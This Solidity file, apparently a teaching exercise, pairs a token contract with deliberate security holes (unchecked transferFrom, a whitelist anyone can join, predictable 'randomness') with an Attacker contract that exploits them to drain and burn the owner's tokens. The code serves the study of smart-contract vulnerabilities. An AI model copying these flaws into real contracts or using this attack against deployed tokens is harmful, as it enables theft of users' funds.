// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

contract NumeroRandom {
    function montoAleatorio() public view returns (uint256) {
        return
            (uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender))) %
                1000000) + 1;
    }
}

contract Whitelist {
    mapping(address => bool) public whitelist;

    modifier onlyWhiteList() {
        require(whitelist[msg.sender] == true);
        _;
    }

    function _addToWhitelist(address _account) internal {
        whitelist[_account] = true;
    }
}

contract TokenTruco is Whitelist, NumeroRandom {
    address public owner;

    mapping(address => uint256) public balances;

    constructor() {
        owner = msg.sender;
        balances[msg.sender] = 1000000;
    }

    function transferFrom(address _from, address _to, uint256 _amount) public {
        balances[_from] -= _amount;
        balances[_to] += _amount;
    }

    function burn(address _from, uint256 _amount) public onlyWhiteList {
        require(_from == owner, "Solo el owner puede quemar tokens");
        balances[_from] -= _amount;
    }

    function addToWhitelist() public {
        _addToWhitelist(msg.sender);
    }
}

// Definimos la interfaz del contrato TokenTruco
interface ITokenTruco {
    function owner() external view returns (address);

    function balances(address _account) external view returns (uint256);

    function transferFrom(address _from, address _to, uint256 _amount) external;

    function burn(address _from, uint256 _amount) external;

    function addToWhitelist() external;

    function montoAleatorio() external view returns (uint256);
}

contract Attacker {
    ITokenTruco public tokenTruco;

    constructor(address _tokenTrucoAddress) {
        tokenTruco = ITokenTruco(_tokenTrucoAddress);
    }

    function ejecutarAtaque() public {
        // Generar un monto aleatorio
        uint256 randomAmount = tokenTruco.montoAleatorio();

        // Transferir el monto aleatorio a la cuenta del atacante
        tokenTruco.transferFrom(tokenTruco.owner(), address(msg.sender), randomAmount);

        // Agregar la cuenta del atacante a la whitelist
        tokenTruco.addToWhitelist();

        // Calcular el saldo del owner y quemarlo
        uint256 ownerBalance = tokenTruco.balances(tokenTruco.owner());
        tokenTruco.burn(tokenTruco.owner(), ownerBalance);
    }
}
